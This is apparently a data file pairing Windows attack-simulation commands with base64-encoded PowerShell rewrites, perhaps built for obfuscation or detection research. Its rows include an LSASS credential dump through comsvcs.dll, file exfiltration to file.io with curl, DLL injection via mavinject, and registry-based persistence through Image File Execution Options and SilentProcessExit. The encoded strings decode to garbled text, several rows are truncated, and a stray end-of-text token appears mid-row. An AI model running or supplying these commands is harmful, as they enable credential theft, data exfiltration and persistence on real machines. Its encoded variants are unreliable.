"schtasks /create /s targetmachine /tn ""MyTask"" /tr ""{CMD}"" /sc daily","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yICJleGUgLWNvbnRlbnQiIHtmaWxlX2F0bGVudCAtaSAjZnMtcXVhbGljIE51bWJlciAicmVxdWly"
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","""C:\Windows\System32\rundll32.exe"" ""C:\windows\System32\comsvcs.dll"",MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full"
"#{curl_path} -k -F ""file=@#{input_file}"" https://file.io/","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLW5hbWV9ICdodHRwOi92ZXJzYm90c1xvYmplY3Q=')) | Invoke-Expression"""
"$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING ""#{dll_payload}""
Stop-Process -processname notepad","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB1bmFtZSBzdHJpbmcgLW5hbWV9ICMje3tleSAxMDB7Y29tcGlsaXRlIHRlbXBvcmF0aW9u')) | Invoke-Expression""<|endoftext|"
"cscript ""#{vbscript}"" > $env:TEMP\T1059.005.out.txt","cscript ""\""vbscript"" > $env:TEMP\T1059.005.out.txt"
tar -cvzf #{output_file} #{input_file_folder},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvbnRyb2xzLmZyYW1ldHJpbmclIGhlYWRlciBmaXQgI3tmaWxlIC90byAiSE5leGVjdXRlIDwgMTAwMDAwMDAwMTApIC"
conhost.exe {CMD},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlcml0dWFsaWUuZXhlIC1kLCAic3RhcnQtcmVtb3Zlci5jb21wYWNrX3BhdGh9')) | Invoke-Expression"" ||| conhost.exe"
"ssh -o ProxyCommand=""{CMD}"" .","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzc3wgcHJpbnR1dGlvbi5leGUgL2h0bWwi')) | Invoke-Expression"""
"$Name = ""GlobalFlag""
$Value = ""512""
$registryPath = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{process}""
New-Item -Path $registryPath -Force
New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force
$Name = ""ReportingMode""
$Value = ""1""
$SilentProcessExit = ""HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{process}""
New-Item -Path $SilentProcessExit -Force
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force 

$Name = ""MonitorProcess""
$Value = ""#{cmd_to_run}""
New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force
Start-Process whoami.exe","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG9wZW5fYXBpLmRvIGFjY2Vzc0NvbW1pdGVyfQo=')) | Invoke-Expression"" ||| $Name = ""GlobalFlag"" ||| $Value = ""512"" ||| $reg"
